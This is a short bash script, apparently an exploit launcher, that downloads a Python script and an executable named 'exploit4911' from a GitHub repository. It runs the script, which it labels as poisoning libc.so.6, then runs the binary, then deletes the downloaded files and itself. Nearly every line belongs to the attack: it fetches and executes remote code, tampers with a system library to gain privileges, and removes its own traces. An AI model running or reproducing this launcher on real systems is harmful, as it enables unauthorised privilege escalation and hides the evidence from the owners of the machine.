#!/bin/bash
# Define URLs for the files
PYTHON_SCRIPT_URL="https://raw.githubusercontent.com/duracellrabbid/test4911a/main/genlib.py"
BINARY_URL="https://raw.githubusercontent.com/duracellrabbid/test4911a/main/exploit4911"

echo "Downloading requisite files"
# Download test.py using wget
wget $PYTHON_SCRIPT_URL -nv

# Download program1 (Linux x86_64 binary) using wget
wget $BINARY_URL -nv

# Make program1 executable
chmod +x exploit4911

# Run the Python script
echo "Poisoning libc.so.6"
python3 genlib.py

# Run the Linux binary (program1)
echo "Running exploit program"
./exploit4911

echo "Cleaning up"
rm -rf '"'
rm ./genlib.py
rm ./exploit4911
rm -- "$0"